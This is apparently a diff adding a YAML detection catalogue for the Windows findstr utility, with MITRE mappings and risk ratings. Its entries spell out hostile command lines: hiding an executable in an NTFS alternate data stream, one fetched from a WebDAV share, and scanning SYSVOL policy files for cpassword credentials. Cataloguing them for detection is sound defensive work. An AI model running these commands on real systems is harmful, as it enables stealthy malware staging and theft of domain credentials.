@@ -1,0 +1,58 @@
+- command: findstr /V /L [PATTERN] c:\ADS\file.exe > c:\ADS\file.txt:file.exe
+  description: Utilizes a combination of findstr and cmd.exe to search for a given pattern in a file - if it doesn't exist, file.exe is written to the ADS of file.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
+  risk: High
+  risk_reason: The combination of findstr with an ADS reference is typically highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: findstr
+  threatactors:
+    N/A:
+      - N/A
+- command: findstr /V /L [PATTERN] \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
+  description: Utilizes a combination of findstr and cmd.exe to search for a given pattern in a file - if it doesn't exist, file.exe is downloaded and written to the ADS of file.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
+  risk: High
+  risk_reason: The combination of findstr with an ADS reference is typically highly suspicious, especially involving the subsequent download of a remote file.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically rare in most organizations.
+  tool: findstr
+  threatactors:
+    N/A:
+      - N/A
+- command: findstr /S /I cpassword \\sysvol\policies\*.xml
+  description: Searches for encoded passwords stored in Group Policy XML files on the active SYSVOL share.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Credential Access:
+      - T1552.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
+    - https://adsecurity.org/?p=2288
+  risk: Critical
+  risk_reason: This is directly indicative of highly suspicious activity.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is extremely rare in most organizations.
+  tool: findstr
+  threatactors:
+    N/A:
+      - N/A
